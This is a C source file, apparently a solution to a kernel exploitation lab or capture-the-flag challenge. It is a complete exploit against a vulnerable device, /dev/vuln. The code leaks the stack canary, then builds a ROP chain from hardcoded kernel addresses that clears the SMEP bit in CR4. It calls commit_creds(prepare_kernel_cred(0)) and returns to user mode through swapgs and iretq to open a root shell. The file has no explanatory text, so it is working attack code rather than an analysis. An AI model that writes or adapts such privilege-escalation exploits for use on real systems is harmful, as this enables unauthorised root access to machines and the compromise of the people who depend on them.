#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>


#define KERNCALL __attribute__((regparm(3)))

void *(*prepare_kernel_cred)(void *) KERNCALL=0xffffffff8109bce0;
void *(*commit_creds)(void *) KERNCALL=0xffffffff8109ba30;
unsigned long pop_rdi_ret=0xffffffff8108e34d;
unsigned long mov_cr4_rdi_pop_rdp_ret=0xffffffff81004d70;
unsigned long swapgs=0xffffffff81060274;

void get_shell()
{
	system("/bin/sh");
}

struct trap_frame {
	void *rip;
	unsigned long cs;
	unsigned long eflags;
	void *rsp;
	unsigned long ss;
}__attribute__((packed));

struct trap_frame tf;

void init_tf_work(void)
{
	asm volatile("movq %%cs,%0;" // tf+8  set cs
	    "pushfq;" //tf+16  set eflags
	    "popq %1;" //tf+16  set eflags
	    "movq %%rsp,%2;"//tf+24  set rsp
	    "movq %%ss,%3;" //tf+32  set ss
	    		:"=r"(tf.cs),"=r"(tf.eflags),
			"=r"(tf.rsp),"=r"(tf.ss));
	tf.rip = &get_shell;
	tf.rsp -= 1024;
}

/*
void trigger_root()
{
	commit_creds(prepare_kernel_cred(0));
	asm("movq %0,%%rsp"::"r"(&tf));
	asm("iretq");
}
*/

void get_root()
{
	commit_creds(prepare_kernel_cred(0));
	asm("swapgs");
	asm("movq %0,%%rsp"::"r"(&tf));
	asm("iretq");
}

int main()
{
	char buf[0x100];
	unsigned long canary;
	int fd=open("/dev/vuln",O_RDWR);

	init_tf_work();
	read(fd,buf,140);
	canary=*(unsigned long*)(buf+100);
	printf("canary:0x%llx\n",canary);

	//trigger smep protect:
	//
	//*(unsigned long*)(buf+124)=(void*)&trigger_smep;
	//write(fd,buf,144);

	unsigned long rop_chain[]={
		pop_rdi_ret,
		0x6f0,
		mov_cr4_rdi_pop_rdp_ret,
		tf.rsp,
		(void*)&get_root
	};
	memcpy(buf+124,rop_chain,sizeof(rop_chain));
	write(fd,buf,sizeof(buf));
	close(fd);

	return 0;
}

